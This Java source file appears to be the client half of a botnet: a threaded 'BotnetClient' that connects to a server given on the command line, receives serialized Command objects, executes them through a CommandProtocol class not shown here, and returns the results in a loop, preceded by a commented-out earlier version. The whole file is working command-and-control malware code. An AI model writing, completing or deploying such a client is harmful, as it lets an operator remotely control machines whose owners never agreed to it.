// import java.net.*;
// import java.io.*;

// public class BotnetClient {
//     public static void main(String[] args) throws IOException {
//         if (args.length != 2) {
//             System.err.println("Usage: java BotnetClient <host name> <port number>");
//             System.exit(1);
//         }

//         String hostName = args[0];
//         int portNumber = Integer.parseInt(args[1]);
//         CommandProtocol commandP = new CommandProtocol();
//         try (Socket socket = new Socket(hostName, portNumber);
//              ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream());
//              ObjectInputStream in = new ObjectInputStream(socket.getInputStream())) {

//             while (true) {
//                 try {
//                     Command inCommand = (Command) in.readObject();
//                     System.out.println("[+] Running Command " + inCommand.getCommandName());
//                     commandP.processCommand(inCommand);

//                     out.writeObject(inCommand);
//                     out.flush();
//                     if (inCommand.getIsExecuted()) {
//                         break;
//                     }
//                 } catch (EOFException e) {
//                     System.err.println("[-] Server closed the connection.");
//                     break;
//                 }
//             }

//         } catch (ClassNotFoundException e) {
//             System.err.println("[-] BotnetClient: Problem reading object: class not found");
//             e.printStackTrace();
//         }
//     }
// }

import java.net.*;
import java.io.*;

/**
 * BotnetClient Class:
 * Object used to receive commands from server, process them, and send back to server
 */
public class BotnetClient extends Thread {
    private String hostName;
    private int portNumber;
    private CommandProtocol commandP;

    public BotnetClient(String hostName, int portNumber) {
        this.hostName = hostName;
        this.portNumber = portNumber;
        this.commandP = new CommandProtocol();
    }

    public void run() {
        Command inCommand = null;
        ObjectOutputStream out = null;
        Socket socket = null;
        ObjectInputStream in = null;

        try {
            socket = new Socket(hostName, portNumber);
            out = new ObjectOutputStream(socket.getOutputStream());
            in = new ObjectInputStream(socket.getInputStream());
            inCommand = (Command) in.readObject();
        } catch (IOException | ClassNotFoundException e) {
            System.err.println("[-] BotnetClient: Problem communicating with server");
            e.printStackTrace();
            return; // Terminate the thread
        }

        try {
            while (true) {
                if (inCommand != null) {
                    System.out.println("[+] Running Command " + inCommand.getCommandName());
                    commandP.processCommand(inCommand);
                    out.writeObject(inCommand);
                    if (inCommand.getErrorStatus()) {
                        break;
                    }
                    try{
                        inCommand = (Command) in.readObject();
                    }catch(ClassNotFoundException e){
                        System.err.println("[-] BotNetClient with server");
                    e.printStackTrace();
                    }
                } else {
                    try {
                        // Sleep for some time before checking again
                        Thread.sleep(1000); // Sleep for 1 second (adjust as needed)
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        } catch (IOException e) {
            System.err.println("[-] BotNetClient: Problem communicating with server");
            e.printStackTrace();
        } finally {
            try {
                if (out != null)
                    out.close();
                if (in != null)
                    in.close();
                if (socket != null)
                    socket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args) {
        if (args.length != 2) {
            System.err.println("Usage: java BotnetClient <host name> <port number>");
            System.exit(1);
        }

        String hostName = args[0];
        int portNumber = Integer.parseInt(args[1]);

        BotnetClient botnetClient = new BotnetClient(hostName, portNumber);
        botnetClient.start(); // Start the botnet client thread
    }
}


